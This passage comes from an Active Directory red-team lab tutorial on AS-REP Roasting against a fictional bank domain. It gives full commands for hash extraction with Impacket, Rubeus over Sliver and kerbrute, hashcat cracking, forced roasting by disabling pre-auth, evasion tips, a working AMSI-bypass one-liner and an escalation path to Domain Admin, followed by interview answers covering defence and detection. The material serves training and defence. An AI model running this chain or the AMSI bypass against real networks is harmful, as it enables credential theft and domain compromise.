**Detection focuses on:**
- Multiple failed pre-auth (Event 4771)
- AS-REQ without pre-auth data
- Requests from unusual sources

**Evasion:**
- Use legitimate user workstation as pivot
- Space requests over time
- Target specific users, not bulk enumeration
- Request during business hours

---

# PART 7: Creating AS-REP Roastable Accounts {#part-7-creating-targets}

## 7.1: When You Have GenericAll/GenericWrite

**If you have write access to a user, you can MAKE them AS-REP Roastable:**

```powershell
# Enable DONT_REQUIRE_PREAUTH via PowerShell
Set-ADAccountControl -Identity target_user -DoesNotRequirePreAuth $true

# Or via direct attribute modification
Set-ADUser -Identity target_user -Replace @{userAccountControl=4260352}
```

## 7.2: The Attack Chain

```
1. Identify user you have GenericWrite on (BloodHound)
   └── User: high_value_target

2. Disable pre-auth for that user
   └── Set-ADAccountControl -Identity high_value_target -DoesNotRequirePreAuth $true

3. AS-REP Roast the user
   └── GetNPUsers.py orsubank.local/high_value_target -no-pass

4. Crack the hash
   └── hashcat -m 18200 hash.txt rockyou.txt

5. Re-enable pre-auth (cleanup)
   └── Set-ADAccountControl -Identity high_value_target -DoesNotRequirePreAuth $false
```

## 7.3: BloodHound Query for This Attack

```cypher
// Find users we can modify who are NOT currently AS-REP Roastable
MATCH (u:User {dontreqpreauth: false})
MATCH (attacker:User {owned: true})-[:GenericAll|GenericWrite|Owns]->(u)
RETURN u.name, attacker.name
```

These are potential targets for "forced AS-REP Roasting."

---

# PART 8: Lab Setup {#part-8-lab-setup}

## 8.1: Running the Setup Script

**On DC01:**

```powershell
cd C:\AD-RTO\lab-config\server
.\Enable-ASREPRoasting.ps1
```

## 8.2: What Gets Created

| Account | Password | Notes |
|---------|----------|-------|
| pranavi | Pranavi@2024! | IT Support |
| harsha.vardhan | Harsha@2024! | Help Desk (path to DA!) |
| kiran.kumar | Kiran@2024! | Developer |

**HIGH VALUE:** harsha.vardhan is in HelpDesk_Team → IT_Support → Server_Admins → Domain Admins!

## 8.3: Verifying Setup

```powershell
# List AS-REP Roastable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,memberOf |
  Select Name, @{N='Groups';E={$_.memberOf -replace 'CN=|,.*'}}
```

**Expected:**
```
Name            Groups
----            ------
pranavi         IT_Support
harsha.vardhan  HelpDesk_Team
kiran.kumar     Developers
```

---

# PART 9: The Attack with Defender Bypass {#part-9-attack-execution}

## 9.1: Method 1 - From Kali WITHOUT Credentials!

**This is the powerful variant - no domain creds needed:**

```bash
# Create username list (from OSINT, enumeration, etc.)
cat > /tmp/users.txt << EOF
pranavi
harsha.vardhan
kiran.kumar
vamsi.krishna
lakshmi.devi
ammulu.orsu
ravi.kumar
svc_sql
svc_backup
EOF

# Run GetNPUsers.py
GetNPUsers.py orsubank.local/ -usersfile /tmp/users.txt -no-pass -dc-ip 192.168.100.10 -format hashcat -outputfile /tmp/asrep_hashes.txt
```

**Output:**
```
Impacket v0.11.0 

[*] Getting TGT for pranavi
$krb5asrep$23$pranavi@ORSUBANK.LOCAL:a1b2c3d4e5f6...

[*] Getting TGT for harsha.vardhan
$krb5asrep$23$harsha.vardhan@ORSUBANK.LOCAL:f6g7h8i9j0...

[*] Getting TGT for kiran.kumar
$krb5asrep$23$kiran.kumar@ORSUBANK.LOCAL:k1l2m3n4o5...

[-] User vamsi.krishna doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lakshmi.devi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ammulu.orsu doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ravi.kumar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_sql doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Saved 3 hashes to /tmp/asrep_hashes.txt
```

**You identified 3 vulnerable accounts WITHOUT any credentials!**

## 9.2: Method 2 - With Rubeus via Sliver

**Requires existing domain access but finds all vulnerable accounts:**

```bash
# First, bypass AMSI
sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*siUtils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"

# Then run Rubeus asreproast
sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe asreproast /nowrap
```

**Output:**
```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: AS-REP roasting

[*] Target Domain          : orsubank.local
[*] Searching path 'LDAP://DC01.orsubank.local/DC=orsubank,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

[*] SamAccountName         : pranavi
[*] DistinguishedName      : CN=pranavi,OU=BankEmployees,DC=orsubank,DC=local
[*] Using domain controller: DC01.orsubank.local (192.168.100.10)
[*] Hash                   : $krb5asrep$pranavi@orsubank.local:a1b2c3d4e5f6...

[*] SamAccountName         : harsha.vardhan
[*] DistinguishedName      : CN=harsha.vardhan,OU=BankEmployees,DC=orsubank,DC=local
[*] Using domain controller: DC01.orsubank.local (192.168.100.10)
[*] Hash                   : $krb5asrep$harsha.vardhan@orsubank.local:f6g7h8i9j0...

[*] SamAccountName         : kiran.kumar
[*] DistinguishedName      : CN=kiran.kumar,OU=BankEmployees,DC=orsubank,DC=local
[*] Using domain controller: DC01.orsubank.local (192.168.100.10)
[*] Hash                   : $krb5asrep$kiran.kumar@orsubank.local:k1l2m3n4o5...
```

## 9.3: Targeting Specific Users

```bash
# Target only high-value (e.g., harsha.vardhan)
sliver > execute-assembly /opt/tools/Rubeus.exe asreproast /user:harsha.vardhan /nowrap
```

## 9.4: Using Kerbrute for AS-REP Roasting

**Kerbrute can AS-REP roast while enumerating:**

```bash
kerbrute userenum --dc 192.168.100.10 -d orsubank.local /tmp/users.txt --downgrade

# --downgrade requests RC4 tickets (faster to crack)
```

---

# PART 10: Cracking Methodology {#part-10-cracking}

## 10.1: Hash Format

```
$krb5asrep$23$harsha.vardhan@ORSUBANK.LOCAL:encrypted_data
```

| Component | Value | Meaning |
|-----------|-------|---------|
| `$krb5asrep$` | - | AS-REP hash identifier |
| `23` | etype | 23 = RC4-HMAC (fast to crack) |
| `harsha.vardhan` | username | Target user |
| `@ORSUBANK.LOCAL` | realm | Domain (uppercase) |
| `:encrypted_data` | hash | The crackable portion |

## 10.2: Hashcat Mode

| Encryption | Hashcat Mode | Speed (RTX 3090) |
|------------|--------------|------------------|
| RC4 (etype 23) | 18200 | ~2.5M hashes/sec |

**Note:** AS-REP hashes are typically RC4. AES AS-REP is rare but would use different modes.

## 10.3: Basic Cracking

```bash
hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## 10.4: With Rules (Recommended)

```bash
# Dictionary + rules for mutations
hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

## 10.5: Corporate Wordlist

```bash
# Create targeted wordlist
cat > corporate.txt << EOF
Orsubank2024
Orsu@2024
Bank2024!
Banking123
Harsha2024
Pranavi123
Kiran@2024
Password123!
Summer2024
Winter2024
EOF

hashcat -m 18200 /tmp/asrep_hashes.txt corporate.txt -r best64.rule
```

## 10.6: Success Output

```
$krb5asrep$23$harsha.vardhan@ORSUBANK.LOCAL:f6g7h8i9...:Harsha@2024!
$krb5asrep$23$pranavi@ORSUBANK.LOCAL:a1b2c3d4...:Pranavi@2024!
$krb5asrep$23$kiran.kumar@ORSUBANK.LOCAL:k1l2m3n4...:Kiran@2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

**Passwords found:**
- harsha.vardhan: `Harsha@2024!`
- pranavi: `Pranavi@2024!`
- kiran.kumar: `Kiran@2024!`

---

# PART 11: Post-Exploitation {#part-11-post-exploitation}

## 11.1: Verify Credentials

```bash
# Test with crackmapexec
crackmapexec smb DC01.orsubank.local -u harsha.vardhan -p 'Harsha@2024!' -d orsubank.local

# Expected for regular user:
SMB   192.168.100.10   445   DC01   [+] orsubank.local\harsha.vardhan:Harsha@2024!
```

## 11.2: Check Group Memberships

```bash
# What groups is harsha.vardhan in?
ldapsearch -H ldap://192.168.100.10 \
  -D "harsha.vardhan@orsubank.local" \
  -w 'Harsha@2024!' \
  -b "DC=orsubank,DC=local" \
  "(sAMAccountName=harsha.vardhan)" \
  memberOf
```

## 11.3: Check BloodHound Path

**harsha.vardhan might have a path to Domain Admin:**

```cypher
MATCH p=shortestPath((u:User {name: "HARSHA.VARDHAN@ORSUBANK.LOCAL"})-[*1..]->(g:Group {name: "DOMAIN ADMINS@ORSUBANK.LOCAL"}))
RETURN p
```

**In our lab:** harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → Domain Admins

## 11.4: Escalate with New Credentials

**Now you have domain credentials, you can:**

1. **Kerberoast** - Use creds to request TGS tickets
   ```bash
   GetUserSPNs.py orsubank.local/harsha.vardhan:'Harsha@2024!' -dc-ip 192.168.100.10 -request
   ```

2. **BloodHound collection** - Run SharpHound
3. **Enumerate further** - LDAP queries, shares, etc.
4. **Follow ACL path** - If nested groups lead to DA

## 11.5: Attack Chain Summary

```
AS-REP ROASTING → DOMAIN ADMIN:
────────────────────────────────────────────────────────────────

1. Initial Recon (No Credentials!)
   └── OSINT gathered employee names
   └── Generated username list

2. Username Enumeration
   └── Kerbrute validated usernames
   └── Identified valid domain accounts

3. AS-REP Roasting
   └── GetNPUsers.py with -no-pass
   └── Got hashes for 3 accounts (no auth needed!)

4. Cracking
   └── hashcat -m 18200
   └── Cracked harsha.vardhan: Harsha@2024!

5. BloodHound Analysis
   └── harsha.vardhan → HelpDesk_Team → IT_Support → Server_Admins → DA

6. Privilege Escalation
   └── Follow nested group path
   └── Abuse memberships to reach Domain Admin

Time: ~2 hours (including OSINT)
Detection: MINIMAL (no auth required for AS-REP!)
```

---

# PART 12: Interview Questions {#part-12-interview}

## Q1: "What is AS-REP Roasting and how does it work?"

**ANSWER:**
"AS-REP Roasting exploits Kerberos accounts that have 'Do not require Kerberos preauthentication' enabled.

Normally, when requesting a TGT, clients must prove their identity by encrypting a timestamp with their password hash (pre-authentication). If an account has the DONT_REQUIRE_PREAUTH flag set (bit 22 of userAccountControl, value 4194304), the KDC skips this verification and returns an encrypted AS-REP directly.

The AS-REP contains a session key encrypted with the user's password hash. Since we receive this without proving identity, we can take it offline and attempt to crack the password.

The attack works by:
1. Identifying users with DONT_REQUIRE_PREAUTH (LDAP filter or tool)
2. Sending AS-REQ without pre-auth data
3. Receiving AS-REP with encrypted session key
4. Cracking with hashcat mode 18200

The key advantage is this works WITHOUT any domain credentials - we just need valid usernames."

---

## Q2: "Explain the userAccountControl attribute and the relevant bit."

**ANSWER:**
"userAccountControl is a 32-bit bitmask attribute on every AD account that controls various account behaviors.

For AS-REP Roasting, bit 22 is critical:
- Bit position: 22
- Hex value: 0x00400000
- Decimal value: 4194304
- Name: DONT_REQUIRE_PREAUTH

When this bit is set, the account doesn't need to provide pre-authentication when requesting a TGT.

To find accounts with this bit set via LDAP:
```
(userAccountControl:1.2.840.113556.1.4.803:=4194304)
```

The OID `1.2.840.113556.1.4.803` means 'bitwise AND' - it returns objects where that specific bit is set.

Other important bits:
- Bit 1 (2): ACCOUNTDISABLE
- Bit 22 (4194304): DONT_REQUIRE_PREAUTH
- Bit 17 (65536): DONT_EXPIRE_PASSWORD
- Bit 19 (524288): TRUSTED_FOR_DELEGATION"

---

## Q3: "How is AS-REP Roasting different from Kerberoasting?"

**ANSWER:**
"Key differences:

**What's attacked:**
- AS-REP: The authentication response (AS-REP)
- Kerberoasting: The service ticket (TGS)

**Target accounts:**
- AS-REP: Accounts with DONT_REQUIRE_PREAUTH
- Kerberoasting: Accounts with SPNs

**Credentials required:**
- AS-REP: NONE - just valid usernames
- Kerberoasting: Any domain user credentials

**Hash type and mode:**
- AS-REP: hashcat mode 18200
- Kerberoasting: hashcat mode 13100

**Detection:**
- AS-REP: Event 4768 with preauth type 0
- Kerberoasting: Event 4769

**Prevalence:**
- AS-REP: Less common (misconfiguration)
- Kerberoasting: Very common (service accounts)

I typically try AS-REP first since it needs no credentials."

---

## Q4: "How would you find AS-REP Roastable accounts?"

**ANSWER:**
"Several methods:

**Via LDAP (with credentials):**
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

**Via PowerShell:**
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**Via BloodHound:**
Pre-built query: 'Find AS-REP Roastable Users (DontReqPreAuth)'
Or Cypher: `MATCH (u:User {dontreqpreauth: true}) RETURN u.name`

**Via Rubeus (with domain access):**
```
Rubeus.exe asreproast /nowrap
```

**Via GetNPUsers.py (without credentials!):**
```bash
GetNPUsers.py domain.local/ -usersfile usernames.txt -no-pass -dc-ip DC_IP
```

The last method is powerful because it identifies vulnerable accounts WITHOUT any credentials."

---

## Q5: "What's the advantage of AS-REP Roasting during initial access?"

**ANSWER:**
"The primary advantage is that AS-REP Roasting works WITHOUT any domain credentials.

For initial access scenarios:
1. During pre-engagement OSINT, I gather employee names from LinkedIn, company website, etc.
2. I generate username variations based on common naming patterns (first.last, flast, etc.)
3. I use Kerbrute to validate which usernames exist
4. I then AS-REP roast against those valid usernames

If ANY account has DONT_REQUIRE_PREAUTH set, I get an encrypted hash I can crack offline.

This provides:
- First foothold without any credentials
- No authentication required to the domain
- Works externally if port 88 is accessible
- Low detection risk (looks like normal auth attempt)

It's a 'free' attack that should always be tried during initial access before attempting password spraying or phishing."

---

## Q6: "How would you create an AS-REP Roastable account for targeted attack?"

**ANSWER:**
"If I have GenericAll, GenericWrite, or similar rights on a user account, I can MAKE that user AS-REP Roastable:

**The attack:**
1. Enable DONT_REQUIRE_PREAUTH on target user:
```powershell
Set-ADAccountControl -Identity target_user -DoesNotRequirePreAuth $true
```

2. AS-REP roast that specific user:
```bash
GetNPUsers.py domain.local/target_user -no-pass -dc-ip DC_IP
```

3. Crack the hash:
```bash
hashcat -m 18200 hash.txt wordlist.txt
```

4. Re-enable pre-auth (cleanup):
```powershell
Set-ADAccountControl -Identity target_user -DoesNotRequirePreAuth $false
```

**BloodHound helps identify targets:**
Users I have GenericAll/GenericWrite on are potential victims for this technique. This is especially useful when the target user is high-privilege but not otherwise attackable."

---

## Q7: "How would you defend against AS-REP Roasting?"

**ANSWER:**
"Multi-layered defense:

**Eliminate the vulnerability:**
- Audit for accounts with DONT_REQUIRE_PREAUTH:
  ```powershell
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
  ```
- Remove the flag unless absolutely required for legacy compatibility
- Document any exceptions with business justification

**Password strength:**
- If pre-auth must be disabled, use 25+ character random passwords
- Implement password complexity requirements

**Detection:**
- Monitor Event ID 4768 (AS operations)
- Alert on pre-auth type 0 (no pre-authentication provided)
- Watch for multiple AS-REQ from non-standard sources

**Honeypots:**
- Create decoy accounts with DONT_REQUIRE_PREAUTH
- Set alerts for any attempt to request TGT for these accounts
- Attackers running enumeration tools will hit them

**Reduce exposure:**
- Never put accounts with disabled pre-auth in privileged groups
- Limit the scope of any required exceptions"

---

## Q8: "What tools do you use for AS-REP Roasting?"

**ANSWER:**
"**Enumeration:**
- **Kerbrute**: Username enumeration via Kerberos, can identify AS-REP roastable accounts
- **ldapsearch**: Direct LDAP queries if I have credentials

**Hash extraction:**
- **GetNPUsers.py (Impacket)**: Works without credentials, my preferred tool for initial access
- **Rubeus**: C# tool via execute-assembly, requires domain access but finds all accounts
- **Invoke-ASREPRoast (PowerShell)**: If PowerShell is available

**Cracking:**
- **Hashcat**: Mode 18200 for AS-REP hashes, GPU accelerated
- **John the Ripper**: Alternative cracker

**My workflow:**
1. Generate username list (OSINT, previous enumeration)
2. `GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC`
3. Save hashes to file
4. `hashcat -m 18200 hashes.txt wordlist.txt -r rules`
5. Verify cracked creds with crackmapexec"

---

## Q9: "How would you detect AS-REP Roasting in your environment?"

**ANSWER:**
"Detection focuses on the unique characteristics of AS-REP requests:

**Event Log Monitoring:**
- Event ID 4768: Kerberos Authentication Service Request
- Key indicator: 'Pre-Authentication Type' = 0 (no pre-auth)
- Normal auth has Pre-Auth Type = 2 (encrypted timestamp)

**Behavioral Analysis:**
- Multiple 4768 events with Type=0 from same source
- AS requests for accounts that don't require pre-auth (you should know which ones)
- Requests from unusual IPs or during off-hours

**Network Monitoring:**
- Kerberos AS-REQ packets without pre-auth data
- Multiple AS-REQ to different users in short time
- Requests from external IPs (if 88 is exposed)

**Honeypots:**
- Create accounts with DONT_REQUIRE_PREAUTH but that should never be used
- Name them attractively: 'svc_backup', 'admin_legacy'
- Any AS-REQ for these accounts = immediate alert

**Audit exceptions:**
- Document all legitimately disabled accounts
- Alert on any NEW accounts with this flag
- Regular audits to identify drift"

---

## Q10: "Explain the relationship between AS-REP hash and the password hash."

**ANSWER:**
"The AS-REP contains an encrypted session key that uses the user's password hash as the encryption key.

**Specifically:**
1. When KDC creates AS-REP, it generates a random session key
2. This session key is encrypted with the user's long-term key (password hash)
3. For RC4 (etype 23), this is the NTLM hash
4. For AES, this is derived from the password via PBKDF2

**What we crack:**
We're not directly cracking the hash - we're trying password guesses:
1. For each password in wordlist:
   - Compute the password hash (NTLM or AES key)
   - Use it to decrypt the encrypted session key
   - Check if decryption produces valid ASN.1 structure
   - If valid → correct password!

**Why RC4 is preferred:**
- RC4 uses NTLM hash directly
- NTLM is just MD4(UTF16LE(password))
- Very fast to compute and test
- ~2.5M guesses/sec on GPU

**AES comparison:**
- AES key derivation uses PBKDF2 with 4096 iterations
- Much slower to compute
- Better security, but we can request RC4 if both are supported"

---

# PART 13: Troubleshooting {#part-13-troubleshoot}

## 13.1: No Vulnerable Accounts Found

**Check lab setup:**
```powershell
# On DC01
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

**If empty, run:**
```powershell
.\Enable-ASREPRoasting.ps1
```

## 13.2: GetNPUsers.py Returns "KDC_ERR_C_PRINCIPAL_UNKNOWN"

**Username doesn't exist.** Check:
- Username spelling
- Domain name in command
- DC IP is correct

## 13.3: GetNPUsers.py Returns "KDC_ERR_PREAUTH_REQUIRED"

**User exists but requires pre-auth.** This is normal for secure accounts - try different usernames.

## 13.4: Hashcat Can't Recognize Hash Format

**Ensure proper format:**
```
$krb5asrep$23$username@DOMAIN:hash_data
```

**Common issues:**
- Missing `$23` etype indicator
- Line wrapping (use `/nowrap` in Rubeus)
- Extra whitespace

## 13.5: Credentials Don't Work After Cracking

**Check if password was changed:**
```powershell
Get-ADUser harsha.vardhan -Properties PasswordLastSet
```

If password changed after you got the AS-REP, your cracked password is outdated.

---

# ✅ VERIFICATION CHECKLIST

- [ ] Understand pre-authentication purpose
- [ ] Know userAccountControl bit 22 (4194304)
- [ ] Ran Enable-ASREPRoasting.ps1 on DC01
- [ ] Found vulnerable accounts via PowerShell
- [ ] AS-REP roasted from Kali (no creds!)
- [ ] Cracked hashes with hashcat -m 18200
- [ ] Verified credentials work
- [ ] Checked BloodHound for escalation path
- [ ] Can answer all 10 interview questions

---

# 🔗 Next Steps

**If harsha.vardhan has path to DA:**
→ **[05. ACL Abuse](./05_acl_abuse.md)** - Follow the nested group path

**Now that you have credentials:**
→ **[02. Kerberoasting](./02_kerberoasting.md)** - Use creds to Kerberoast service accounts
→ **[01. BloodHound](./01_domain_enumeration_bloodhound.md)** - Full enumeration with creds

**Continue credential attacks:**
→ **[04. Credential Dumping](./04_credential_dumping.md)** - Dump LSASS
→ **[06. Pass-the-Hash](./06_pass_the_hash.md)** - Lateral movement

---

**MITRE ATT&CK Mapping:**

| Technique | ID | Description |
|-----------|-----|-------------|
| Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 | Request TGT without pre-auth, crack offline |
| Account Discovery | T1087 | Enumerate valid usernames |

---

**Interview Importance:** ⭐⭐⭐⭐ (Common interview topic - especially "vs Kerberoasting")

